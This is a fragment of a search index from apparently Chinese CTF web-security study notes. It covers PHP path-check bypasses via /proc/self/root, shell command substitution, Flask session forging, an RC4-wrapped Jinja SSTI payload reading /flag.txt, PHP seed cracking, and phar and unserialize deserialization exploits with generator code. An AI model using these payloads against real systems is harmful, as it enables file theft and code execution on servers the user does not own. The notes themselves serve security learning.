<pre><code>https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649729209&amp;idx=1&amp;sn=78c1f6cf291e5cfca3088f02216ccffd&amp;chksm=888c98d6bffb11c014d8f98437879564702bd35b100f4337cbdf1f3cff827edfa4b9a8672637&amp;mpshare=1&amp;scene=23&amp;srcid=0812s60kjiOtHT66otXJWIHt&amp;sharer_sharetime=1597388716474&amp;seharer_shareid=33a823b10ae99f33a60db621d83241cb#rd\n</code></pre> <p>\u6240\u4ee5\u6700\u540e\uff1a\"/proc/self/root\"*21+/flag\u5c31\u53ef\u4ee5\u5b8c\u6210\u7ed5\u8fc7\u3002</p> <p>[WMCTF2020]Make PHP Great Again</p> <p>\u4ee3\u7801\u5341\u5206\u7b80\u5355\uff0c\u9700\u8981\u7528\u5230\u7684\u662f\u5728\u7fa4\u91cc\u6240\u53d1\u7684\u90a3\u4e2a\u6f0f\u6d1e\uff0c/proc/self/root/\u662f\u6307\u5411/\u7684\u7b26\u53f7\u94fe\u63a5\u3002\uff08PHP\u5185\u6838\u6211\u770b\u8d77\u6765\u4e5f\u6bd4\u8f83\u5403\u529b\uff09\u5173\u952e\u70b9\u5e94\u8be5\u662f\uff1alstat\u51fd\u6570\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\u8bfb\u53d6path\u5b58\u5728\u4e86\u4e00\u4e2a\u6700\u5927\u503c\uff0c\u4f1a\u8ba4\u4e3a\u8def\u5f84\u4e0d\u5b58\u5728\uff0c\u7136\u540e\u6709\u53e6\u5916\u4e00\u4e2a\u51fd\u6570virtual_file_ex(..., CWD_FILEPATH)\uff0c\u5f53\u8def\u5f84\u4e0d\u5b58\u5728\u65f6\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5408\u6cd5\u7684\u8def\u5f84\uff0c\u56e0\u6b64\u7ed5\u8fc7lstat\u540e\u76f8\u5f53\u4e8e\u65f6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u4e86\uff0c\u5f53\u7136\u9700\u8981php\u7684\u4f2a\u534f\u8bae\u8bfb\u6d41\u3002</p> <p>\"/proc/self/root\"*21+/flag</p>"},{"location":"web_bak/linux/%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C/","title":"\u5185\u8054\u6267\u884c","text":"<p>linux\u5185\u8054\u6267\u884c\u4e00\u822c\u662f\u7275\u626f\u5230<code>`\uff08\u6ce8\u610f\u662f\u952e\u76d8\u5de6\u4e0a\u89d2\u7684</code>\u4e0d\u662f'\uff09\u548c$()</p> <p>\u8fd9\u4e24\u8005\u7684\u4f5c\u7528\u90fd\u662f\u4e00\u6837\u7684\uff0c\u5c06\u5305\u62ec\u8d77\u6765\u7684\u5185\u5bb9\u5148\u4e8e\u5916\u90e8\u8868\u8fbe\u5f0f\u89e3\u6790</p> <p>\u6bd4\u5982\u8bf4\uff1a</p> <p>cat $(ls) \u548c cat <code>ls</code></p> <p>\u5b9e\u9645\u6548\u679c\u662f\u5148ls \u7136\u540ecat \u201cls\u201d\u547d\u4ee4\u7684\u56de\u663e\uff0c\u5982\u679c\u5728\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u6709\u4e2aflag.txt</p> <p>\u4f60\u5c31\u53ef\u4ee5\u5148\u8fdb\u5165\u8fd9\u4e2a\u6587\u4ef6\u5939,\u7136\u540ecat $(ls)\u6765\u8bfb\u53d6flag.txt</p> <p>\u4ed6\u4eec\u90fd\u4e0d\u80fd\u5d4c\u5957\u8c03\u7528\u3002</p> <p>\u6b63\u5e38\u4e00\u822c\u4f7f\u7528$()\uff0c\u56e0\u4e3a\u53cd\u5f15\u53f7\u6709\u65f6\u5019\u4f1a\u88ab\u8f6c\u79fb\uff0c\u4e0d\u8fc7\u5f53\u4e00\u822c\u51fa\u73b0\u5b57\u7b26\u6570\u9650\u5236\u7684\u8bdd\u5219\u4f1a\u4f7f\u7528\u5230</p> <p>``\u539f\u56e0\u662f\u5b83\u5c11\u4e86\u4e00\u4e2a\u5b57\u7b26\u3002</p> <p></p>"},{"location":"web_bak/scripts/Flask-Session%E8%84%9A%E6%9C%AC%E8%A7%A3%E5%AF%86/","title":"Flask-Session\u811a\u672c\u89e3\u5bc6","text":"<p>\u7528\u4e8esession\u4f2a\u9020\u4e4b\u4e2d</p> <pre><code>\u56e0\u4e3a\u662f\u5df2\u7ecf\u4e0b\u8f7d\u4e86\u4e0b\u6765\uff0c\u4e0b\u9762\u653e\u4e0a\u4f7f\u7528\u65b9\u6cd5\u5c31\u597d\u4e86\npython3 session_cookie_manager.py decode -c 'ImFhYSI.YEdeLg.moazuNx4ewWV2f6l_7W9mCGDZqU' -s 'fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y'\u89e3\u5bc6\uff08session\uff09\n\n\npython3 session_cookie_manager.py encode -s '155.560932545' -t \"{'username': b'fuck'}\"\n(\u52a0\u5bc6session)\n</code></pre>"},{"location":"web_bak/scripts/RC4%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC/","title":"RC4\u52a0\u5bc6\u811a\u672c\uff1a","text":"<pre><code>Import base64\nfrom urllib.parse import quote\ndef rc4_main(key = \"init_key\", message = \"init_message\"):\n    # print(\"RC4\u52a0\u5bc6\u4e3b\u51fd\u6570\")\n    s_box = rc4_init_sbox(key)\n    crypt = str(rc4_excrypt(message, s_box))\n    return  crypt\ndef rc4_init_sbox(key):\n    s_box = list(range(256))  # \u6211\u8fd9\u91cc\u6ca1\u7ba1\u79d8\u94a5\u5c0f\u4e8e256\u7684\u60c5\u51b5\uff0c\u5c0f\u4e8e256\u4e0d\u65ad\u91cd\u590d\u586b\u5145\u5373\u53ef\n    # print(\"\u539f\u6765\u7684 s \u76d2\uff1a%s\" % s_box)\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    # print(\"\u6df7\u4e71\u540e\u7684 s \u76d2\uff1a%s\"% s_box)\n    return s_box\ndef rc4_excrypt(plain, box):\n    # print(\"\u8c03\u7528\u52a0\u5bc6\u7a0b\u5e8f\u6210\u529f\u3002\")\n    res = []\n    i = j = 0\n    for s in plain:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))\n    # print(\"res\u7528\u4e8e\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u52a0\u5bc6\u540e\u662f\uff1a%res\" %res)\n    cipher = \"\".join(res)\n    print(\"\u52a0\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u662f\uff1a%s\" %quote(cipher))\n    #print(\"\u52a0\u5bc6\u540e\u7684\u8f93\u51fa(\u7ecf\u8fc7\u7f16\u7801):\")\n    #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\n    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\nrc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()}}\")\n</code></pre>"},{"location":"web_bak/scripts/md5%E6%88%AA%E6%96%AD%E7%88%86%E7%A0%B4/","title":"md5\u622a\u65ad\u7206\u7834","text":"<pre><code>\u5c31\u662f\u8bf4\u7ed9\u51famd5\u540e\u524d\u591a\u5c11\u4f4d\u6570\u5b57\uff0c\u6c42\u539f\u6570\u5b57\n\u811a\u672c\u5982\u4e0b\nfrom multiprocessing.dummy import Pool as tp\nimport hashlib\n\nknownMd5 = 'af53d'      #\u5df2\u77e5\u7684md5\u660e\u6587\ndef md5(text):\n    return hashlib.md5(str(text).encode('utf-8')).hexdigest()\n\ndef findCode(code):\n    key = code.split(':')\n    start = int(key[0])\n    end = int(key[1])\n    for code in range(start, end):\n        if md5(code)[0:5] == knownMd5:\n            print(code)\n            break\nlist=[]\nfor i in range(3):    #\u8fd9\u91cc\u7684range(number)\u6307\u7206\u7834\u51fa\u591a\u5c11\u7ed3\u679c\u505c\u6b62\n    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))\npool = tp()    #\u4f7f\u7528\u591a\u7ebf\u7a0b\u52a0\u5feb\u7206\u7834\u901f\u5ea6\npool.map(findCode, list)\npool.close()\npool.join()\n</code></pre>"},{"location":"web_bak/scripts/php_seed%E7%88%86%E7%A0%B4/","title":"php seed\u7206\u7834","text":"<pre><code>\u662fphp\u4e2d\u7684\u4e24\u4e2a\u751f\u6210\u968f\u673a\u6570\u7684\u51fd\u6570\u5176\u5b9e\u662f\u4f2a\u968f\u673a\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u7206\u7834\u51fa\u6765\u5177\u4f53\u8be5\u600e\u4e48\u505a\u597d\u50cf\u4e5f\u6ca1\u4ec0\u4e48\u597d\u89e3\u91ca\u7684\uff0c\u6240\u4ee5\u5e72\u8106\u76f4\u63a5\u628a\u4ee3\u7801\u653e\u4e0a\u6765\u7528\u597d\u4e86\u3002\n\ns = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nkey = 'c1z5DuPZXT'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n\u5c06\u751f\u6210\u7684\u53c2\u6570\u653e\u5230\u4e00\u4e2a\u53eb\u505aphp_mt_seed4.0\u7684\u811a\u672c\u4e2d\u5c31\u597d\u4e86\n\u4f7f\u7528\u4e86mt_srand()\u51fd\u6570\u64ad\u79cd\uff0c\u5e76\u4f7f\u7528mt_rand()\u51fd\u6570\u751f\u6210\u968f\u673a\u6570\u3002\u8fd9\u91cc\u7684\u968f\u673a\u6570\u90fd\u662f\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u8981\u5f97\u5230\u79cd\u5b50\uff0c\u5c31\u53ef\u4ee5\u751f\u6210\u76f8\u540c\u7684\u968f\u673a\u6570\u3002\n</code></pre> <p>\u4e0b\u9762\u7684\u4e1c\u897f\u53ef\u4ee5\u4e0b\u8f7dphp_mt_seed4.0\uff1a</p> <p>https://thoughts.aliyun.com/workspaces/5f98e6276b9dce0024026750/docs/607d8129e87e050001924835</p>"},{"location":"web_bak/scripts/%E5%8F%96%E5%8F%8D%E5%AD%97%E7%AC%A6/","title":"\u53d6\u53cd\u5b57\u7b26","text":"<pre><code>&lt;?php\nheader('Content-Type: text/html; charset=utf-8');\n$str = 'string ';\nfor($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++)\n{\n    $st = mb_substr($str, $i,1, 'utf-8');\n    $a = ~($st);\n    $b = $a[1];             #\u53d6\u6c49\u5b57\u7684\u7b2c\u4e00\u4f4d\n    if($b==$_GET['a'])      #$_GET['a']\u60f3\u8981\u5f97\u5230\u7684\u5b57\u7b26\n    {\n        echo $st;exit;\n    }\n    }\n?&gt;\n</code></pre>"},{"location":"web_bak/serialize/PHP/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"phar://\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p><code>phar</code>\u5728\u538b\u7f29\u6587\u4ef6\u5305\u65f6\uff0c\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684<code>meta-data</code>\uff0c\u914d\u5408<code>phar://</code>\u5c31\u80fd\u4e00\u4e9b\u51fd\u6570\u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4e8e\u662f\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u7cbe\u5fc3\u6784\u9020<code>phar</code>\u5305\u5728\u6ca1\u6709<code>unserialize()</code>\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u53cd\u5e8f\u5217\u5316\u653b\u51fb\uff0c\u4ece\u800c\u5f88\u5927\u7684\u62d3\u5c55\u4e86\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u653b\u51fb\u9762</p>"},{"location":"web_bak/serialize/PHP/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#phar_1","title":"phar://\u4f2a\u534f\u8bae","text":"<pre><code>phar://\u534f\u8bae\u4e0ezip://\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u8bbf\u95eezip\u683c\u5f0f\u538b\u7f29\u5305\u5185\u5bb9\uff0c\u5728\u8fd9\u91cc\u53ea\u7ed9\u51fa\u4e00\u4e2a\u793a\u4f8b\uff1a\n</code></pre> <pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\n</code></pre>"},{"location":"web_bak/serialize/PHP/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_1","title":"phar://\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>\u4e0b\u9762\u662f\u6211\u81ea\u5df1\u7684\u603b\u7ed3\uff1a</p> <p>\u8fd9\u91cc\u7a0d\u5fae\u63cf\u8ff0\u4e00\u4e0bphar\uff0c\u7c7b\u4f3cjava\u4e2d\u7684jar\uff0cphar\u662f\u4e00\u4e2a\u5408\u6210\u8bcd\uff0c\u7531PHP \u548c Archive\u6784\u6210\uff0c\u53ef\u4ee5\u770b\u51fa\u5b83\u662fphp\u5f52\u6863\u6587\u4ef6\u7684\u610f\u601d\u3002phar\u5f52\u6863\u6587\u4ef6\u6709\u4e09\u79cd\u683c\u5f0f\uff1atar\u5f52\u6863\u3001zip\u5f52\u6863\u3001phar\u5f52\u6863\uff0c\u524d\u4e24\u79cd\u6267\u884c\u9700\u8981php\u5b89\u88c5Phar \u6269\u5c55\u652f\u6301\uff0c\u7528\u7684\u4e5f\u6bd4\u8f83\u5c11\uff0c\u8fd9\u91cc\u4e3b\u8981\u8bb2phar\u5f52\u6863\u683c\u5f0f\u3002</p> <p>phar\u683c\u5f0f\u5f52\u6863\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\uff0c\u5b83\u7684\u4ea7\u751f\u4f9d\u8d56\u4e8ePhar\u6269\u5c55\uff0c\u7531\u81ea\u5df1\u7f16\u5199\u7684php\u811a\u672c\u4ea7\u751f\u3002\u4e5f\u662f\u4e00\u79cd\u6d41\u5305\u88c5\u5668\u3002</p> <pre><code>&lt;?php\n    class User {\n        public $db;\n    } \n    class File{\n        public $filename;\n        public function __construct($name){\n            $this-&gt;filename=$name;\n        }\n    }\n    class FileList {\n        private $files;\n        public function __construct(){\n            $this-&gt;files=array(new File('/flag.txt'));\n        }\n    } //\u4e0a\u9762\u662f\u53cd\u5e8f\u5217\u5316\uff0c\u5b9e\u9645\u7528\u4e0b\u6765\u6a21\u677f\u4e00\u70b9\u70b9\u7684\u4e1c\u897f\u5728\u4e0b\u9762\n    $o = new User();\n    $o-&gt;db =new FileList();\n    @unlink(\"phar.phar\");//\u5220\u9664\u4e4b\u524d\u7684test.par\u6587\u4ef6(\u5982\u679c\u6709)\n    $phar = new Phar(\"phar.phar\");//\u521b\u5efa\u4e00\u4e2aphar\u5bf9\u8c61\uff0c\u6587\u4ef6\u540d\u5fc5\u987b\u4ee5phar\u4e3a\u540e\u7f00\n    $phar-&gt;startBuffering();//\u5f00\u59cb\u5199\u6587\u4ef6\n    $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");//\u5199\u5165stub\n    $phar-&gt;setMetadata($o);//\u5199\u5165meta-data\n    $phar-&gt;addFromString(\"test.txt\", \"test\"); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n    $phar-&gt;stopBuffering();\n?&gt;\n</code></pre> <p>\u719f\u6089\u7684\u8bdd\u5e94\u8be5\u80fd\u770b\u51fa\u8fd9\u4e2a\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4f46\u5b83\u8ddfphar\u4f2a\u534f\u8bae\u6709\u6709\u4ec0\u4e48\u8054\u7cfb\u5462\uff1f</p> <p>\uff08\u5176\u5b9e\u662f\u548c\u53cd\u5e8f\u5217\u5316\u6d89\u53ca\u5230\u7684\u6587\u4ef6\u5305\u542b\uff09</p> <p>\u867d\u7136\u6bd4\u8f83\u7279\u4f8b\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6a21\u677f\u4e86\uff0c\u5229\u7528\u65b9\u5f0f\u4f1a\u4e0e\u6587\u4ef6\u4e0a\u4f20\u4e00\u8d77\uff0c\u7136\u540e\u5229\u7528phar://\u4f2a\u534f\u8bae\u6765\u8bbf\u95ee\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u3002</p> <p>\u987a\u5e26\u4e00\u63d0\u5c31\u662f\u5728\u4f7f\u7528phar\u4ee3\u7801\u65f6\uff0c\u8981\u628aphp.ini\u6587\u4ef6\u4e2d\u7684phar.readonly \u8bbe\u7f6e\u4e3aOFF.</p> <p>\u7a0d\u5fae\u5177\u4f53\u70b9\u4ecb\u7ecd\uff1a</p> <pre><code>stub\nphar \u6587\u4ef6\u6807\u8bc6\uff0c\u683c\u5f0f\u4e3a xxx&lt;?php xxx; __HALT_COMPILER();?&gt;\uff1b\nmanifest\n\u538b\u7f29\u6587\u4ef6\u7684\u5c5e\u6027\u7b49\u4fe1\u606f\uff0c\u4ee5/*\u5e8f\u5217\u5316*/\u5b58\u50a8\uff1b\ncontents\n\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\uff1b\nsignature\n\u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff1b\u8fd9\u91cc\u6709\u4e24\u4e2a\u5173\u952e\u70b9\uff0c\u4e00\u662f\u6587\u4ef6\u6807\u8bc6\uff0c\u5fc5\u987b\u4ee5__HALT_COMPILER();?&gt;\u7ed3\u5c3e\uff0c\u4f46\u524d\u9762\u7684\u5185\u5bb9\u6ca1\u6709\u9650\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u8f7b\u6613\u4f2a\u9020\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u6216\u8005pdf\u6587\u4ef6\u6765\u7ed5\u8fc7\u4e00\u4e9b\u4e0a\u4f20\u9650\u5236\uff1b\u4e8c\u662f\u53cd\u5e8f\u5217\u5316\uff0cphar\u5b58\u50a8\u7684meta-data\u4fe1\u606f\u4ee5\u5e8f\u5217\u5316\u65b9\u5f0f\u5b58\u50a8\uff0c\u5f53\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\u5c31\u4f1a\u5c06\u6570\u636e\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u8fd9\u6837\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u6709\u5f88\u591a\u3002\n</code></pre> <p>\u4f8b\u9898\uff1a</p> <p>[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web1]Dropbox</p>"},{"location":"web_bak/serialize/PHP/php_serialize/","title":"\u5b9a\u4e49\u53ca\u7406\u89e3","text":"<p>ps:\uff08\u524d\u4e24\u5c0f\u90e8\u5206\u6709\u57fa\u7840\u7684\u5c31\u4e0d\u7528\u6765\u770b\u4e86\u3002\uff09</p> <p>\u5e8f\u5217\u5316\u7684\u76ee\u7684\u662f\u65b9\u4fbf\u6570\u636e\u7684\u4f20\u8f93\u548c\u5b58\u50a8\u3002</p> <p>\u5728\u4f20\u9012\u53d8\u91cf\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6709\u53ef\u80fd\u9047\u5230\u53d8\u91cf\u503c\u8981\u8de8\u811a\u672c\u6587\u4ef6\u4f20\u9012\u7684\u8fc7\u7a0b\u3002\u5982\u679c\u4e00\u4e2a\u811a\u672c\u4e2d\u60f3\u8981\u7684\u8c03\u7528\u4e4b\u524d\u4e00\u4e2a\u811a\u672c\u7684\u53d8\u91cf\uff0c\u4f46\u662f\u4e4b\u524d\u4e00\u4e2a\u811a\u672c\u5df2\u7ecf\u6267\u884c\u5b8c\u6bd5\uff0c\u6240\u6709\u7684\u53d8\u91cf\u548c\u5185\u5bb9\u91ca\u653e\u6389\u4e86\uff0c\u90a3\u8be5\u5982\u4f55\u64cd\u4f5c\u5462\uff1fserialize\u548cunserialize\u5c31\u662f\u89e3\u51b3\u8fd9\u4e00\u95ee\uff0c\u9898\u7684\u5b58\u5728\uff0cserialize\u53ef\u4ee5\u5c06\u53d8\u91cf\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5728\u8f6c\u6362\u7684\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u4fdd\u5b58\u5f53\u524d\u53d8\u91cf\u7684\u503c\uff0c\u800cunserialize\u5219\u53ef\u4ee5\u5c06serialize\u751f\u6210\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u56de\u53d8\u91cf\u3002</p> <p>\u5728PHP\u5e94\u7528\u4e2d\uff0c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e00\u822c\u7528\u505a\u7f13\u5b58\uff0c\u6bd4\u5982session\u7f13\u5b58\uff0ccookie\u7b49\u3002</p> <p>PHP\u901a\u8fc7string serialize ( mixed $value )\u548cmixed unserialize ( string $str )\u4e24\u4e2a\u51fd\u6570\u5b9e\u73b0\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u3002\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u6267\u884c\u5b8c\u4e4b\u540e\u7684\u7ed3\u679c\u4e3aO:1:\"a\":1:{s:1:\"b\";i:1;}</p> <p>\u89e3\u8bfb\u7684\u8bdd\u662f\u8fd9\u6837\u7684\uff1a<code>\u5bf9\u8c61\u7c7b\u578b:\u957f\u5ea6:\"\u7c7b\u540d\":\u7c7b\u4e2d\u53d8\u91cf\u7684\u4e2a\u6570:{\u7c7b\u578b:\u957f\u5ea6:\"\u503c\";\u7c7b\u578b:\u957f\u5ea6:\"\u503c\";......}</code></p> <p>\u5982\u679c\u4f7f\u7528unserilize\u51fd\u6570\u7684\u8bdd\uff0c\u5c31\u4f1a\u5c06\u8fd9\u4e00\u4e32\u5b57\u7b26\u91cd\u65b0\u52a0\u8f7d\u56de\u7c7b\u3002</p> <p>$a=unserilize('O:1:\"a\":1:{s:1:\"b\";i:1;}')</p>"},{"location":"web_bak/serialize/PHP/php_serialize/#magic","title":"MAGIC\u51fd\u6570","text":"<p>\u7c7b\u4e2d\u53ef\u80fd\u4f1a\u5305\u542b\u4e00\u4e9b\u7279\u6b8a\u7684\u51fd\u6570\u53ebmagic\u51fd\u6570\uff0cmagic\u51fd\u6570\u547d\u540d\u662f\u4ee5\u7b26\u53f7\u201c_\u201d\u5f00\u5934\u7684\uff0c\u6bd4\u5982_construct,_destruct,_toString,_sleep,_wakeup\u7b49\u3002\u8fd9\u4e9b\u51fd\u6570\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u81ea\u52a8\u8c03\u7528\uff0c\u6bd4\u5982\uff1a_construct\u5f53\u4e00\u4e2a\u5bf9\u8c61\u521b\u5efa\u65f6\u8c03\u7528\uff08constructor\uff09\uff1b_destruct\u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u8c03\u7528\uff08destructor\uff09\uff1b_toString\u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b26\u4e32\u65f6\u4f7f\u7528\u3002</p> <pre><code>&lt;?php\nclass test{    public $variable = 'BUZZ';    public $variable2 = 'OTHER';    public function printvariable()    {        echo $this-&gt;variable.'&lt;br /&gt;';    }    public function __construct()    {        echo '__construct'.'&lt;br /&gt;';    }    public function __destruct()    {        echo '__destruct'.'&lt;br /&gt;';    }    public function __wakeup()    {        echo '__wakeup'.'&lt;br /&gt;';    }    public function __sleep()    {        echo '__sleep'.'&lt;br /&gt;';        return array('variable','variable2');    }}\n//\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\uff0c\u56de\u8c03\u7528__construct$object = new test();//\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4f1a\u8c03\u7528__sleep$serialized = serialize($object);//\u8f93\u51fa\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32print 'Serialized:'.$serialized.'&lt;br /&gt;';//\u91cd\u5efa\u5bf9\u8c61\uff0c\u4f1a\u8c03\u7528__wakeup$object2 = unserialize($serialized);//\u8c03\u7528printvariable,\u4f1a\u8f93\u51fa\u6570\u636e(BUZZ)$object2-&gt;printvariable();//\u811a\u672c\u7ed3\u675f\uff0c\u4f1a\u8c03\u7528__destruct?&gt;//test4.php\n</code></pre> <p>\u5f97\u5230\u7684\u7ed3\u679c\u662f\u8fd9\u6837\u7684\uff1a\uff08\u53ef\u4ee5\u81ea\u5df1\u53bb\u8bd5\u8bd5\uff09</p> <p></p> <p>\u53cd\u5e8f\u5217\u5316\u5728\u7279\u5b9a\u6761\u4ef6\u4e0b\u53ef\u4ee5\u91cd\u5efaphp\u5bf9\u8c61\u5e76\u6267\u884cphp\u5bf9\u8c61\u4e2d\u67d0\u4e9bmagic\u51fd\u6570\u3002</p> <p>\u8fd9\u4fbf\u5c31\u662f\u6f0f\u6d1e\u6765\u6e90\uff0c\u6765\u81ea\u8fd9\u4e9b\u81ea\u52a8\u8c03\u7528\u7684__magic\u51fd\u6570,\u5982\u679c\u5176\u4e2d\u6709\u67d0\u4e9b\u53c2\u6570\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u5b83\u8df3\u5230\u67d0\u4e2a\u4ee3\u7801\u6a21\u5757\u4e4b\u4e2d\u3002</p> <p></p> <p>\u5269\u4e0b\u7684\u9047\u89c1\u4e86\u4e5f\u53ef\u4ee5\u5728\u6b64\u8865\u5145\uff1a</p> <p>__tostring:\u5f53\u7c7b\u88ab\u5f53\u6210\u5b57\u7b26\u4e32\u65f6\u8c03\u7528\u3002</p> <p>\u8fd9\u4e9b\u662f\u5e38\u89c1\u7684\u3002</p>"},{"location":"web_bak/serialize/PHP/php_serialize/#_2","title":"\u521d\u7ea7\u7684\u6f0f\u6d1e\u6848\u4f8b","text":"<pre><code>&lt;?php\nclass A{\nvar $test = \"demo\";\nfunction __destruct(){\necho $this-&gt;test;\n}\n}\n$a = $_GET['test'];\n$a_unser = unserialize($a);\n?&gt;\n</code></pre> <p>\u5f88\u7ecf\u5178\uff0cGET\u5f97\u5230test\u53c2\u6570\uff0c\u7136\u540e\u53cd\u5e8f\u5217\u5316\uff0c\u91cc\u9762\u6709\u4e2a__destruct---\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u89e6\u53d1\u3002</p> <p>\u5982\u679c\u6211\u4eec\u8f93\u5165<code>?test=O:1:\"A\":1:{s:4:\"test\";s:4:\"test\";}</code></p> <p>\u4e5f\u5c31\u662f\u4e0b\u9762\u8fd9\u4e00\u5c0f\u6bb5\u7684\u7ed3\u679c\u3002</p> <pre><code>&lt;?php\nclass A{\nvar $test = \"demo\";\nfunction __destruct(){\necho $this-&gt;test;\n}\n}\n$a= new A();\n$a-&gt;test=\"test\";\necho serialize($a);\n?&gt;\n</code></pre> <p>\u5f53\u8fd9\u6bb5\u4ee3\u7801\u6267\u884c\u5b8c\u6210\u540e\u4f1a\u8c03\u7528__destruct,\u5e76\u4e14echo  \"test\"\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u4f1a\u53d1\u73b0\u76f8\u5f53\u4e8e$test\u53d8\u6210\u4e86\u6211\u4eec\u7684\u53ef\u63a7\u53c2\u6570\uff0c\u8fd9\u91cc\u7684__destrcut\u4e0b\u7684\u51fd\u6570\u662fecho,\u90a3\u5982\u679c\u662feval(){\u5c06\u5b57\u7b26\u4e32\u4f5c\u4e3aPHP\u4ee3\u7801\u6267\u884c}\u5462\uff1f\u540e\u679c\u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c\u6211\u4eec\u7684\u4ee3\u7801\u3002\u5c06test\u6539\u4e3acat /flag.</p> <p>unserialize\u6f0f\u6d1e\u4f9d\u8d56\u51e0\u4e2a\u6761\u4ef6\uff1a</p> <p>unserialize\u51fd\u6570\u7684\u53c2\u6570\u53ef\u63a7</p> <p>\u811a\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff08__construct()\uff09\u3001\u6790\u6784\u51fd\u6570\uff08__destruct()\uff09\u3001__wakeup()\u51fd\u6570\u4e2d\u6709\u5411php\u6587\u4ef6\u4e2d\u5199\u6570\u636e\u7684\u64cd\u4f5c\u7684\u7c7b</p> 